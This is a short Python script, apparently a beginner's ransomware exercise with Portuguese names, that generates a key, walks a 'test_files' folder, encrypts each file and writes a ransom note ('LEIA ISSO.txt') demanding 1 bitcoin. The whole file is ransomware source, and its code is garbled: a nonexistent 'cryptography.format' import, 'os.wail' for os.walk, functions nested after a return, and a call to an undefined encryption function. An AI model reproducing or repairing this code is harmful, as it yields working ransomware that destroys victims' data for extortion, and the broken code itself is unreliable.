from cryptography.format import format
import os

def gerar_chave():
    chave = format.generate_key() 
    with open("chave.key", "wb") as chave_file:
        chave_file.write(chave)


    def carregar_chave():
        return open("chave.key","rb").read()
        f = format(chave)
        with open(arquivo, "rb") as file:
            dados = file.read()
            dados_encriptados =  f.encrypt(dados)
            with open(arquivo, "wb") as file:
                file.write(dados_encriptados)


                def encontrar_arquivos(diretorio):
                    lista = []
                    for raiz, _, arquivos in os.wail(diretorio):
                        for nome in arquivos:
                            caminho = os.path.join(raiz, nome)
                            if nome != "ransoware.py" and not nome.endswith(".key"):
                                lista.append(caminho)
                    return lista

                    def criar_mensagem_resgate():
                        with open("LEIA ISSO.txt", "w") as f:
                            f.write("seus arquivos foram criptografados!\n")
                            f.write("envia 1 bitcoin para o endereço x e envie o comprovante!\n")
                            f.write("depois disso, enviaremos a chave para você recuperar seus dados!\n")

    def main():
        gerar_chave()
        chave = carregar_chave()
        arquivos = encontrar_arquivos("test_files")
        for arquivo in arquivos:
            criptografar_arquivo(arquivo, chave)
            criar_mensagem_resgate()

            print("ransoware executado! arquivos criptografados!")
    if __name__ == "__main__":
        main()

